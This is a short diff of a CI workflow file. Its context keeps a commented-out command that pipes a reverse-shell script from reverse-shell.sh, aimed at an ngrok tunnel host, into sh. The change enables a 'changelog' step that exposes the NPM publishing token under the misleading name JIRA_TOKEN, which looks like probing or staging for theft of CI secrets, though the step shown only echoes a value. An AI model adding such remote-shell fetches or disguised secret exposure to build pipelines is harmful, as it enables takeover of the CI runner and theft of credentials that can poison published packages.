@@ -27,11 +27,11 @@ jobs:
           # echo $x
           # sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:11069 | sh'
 
-      # - name: Update CHANGELOG.md
-      #   env:
-      #     JIRA_TOKEN: ${{ secrets.CI_JIRA_TOKEN }}
-      #   run: |
-      #     echo 1
+      - name: Update CHANGELOG.md
+        env:
+          JIRA_TOKEN: ${{ secrets.CI_NPM_TOKEN }}
+        run: |
+          echo 1
 
 
           
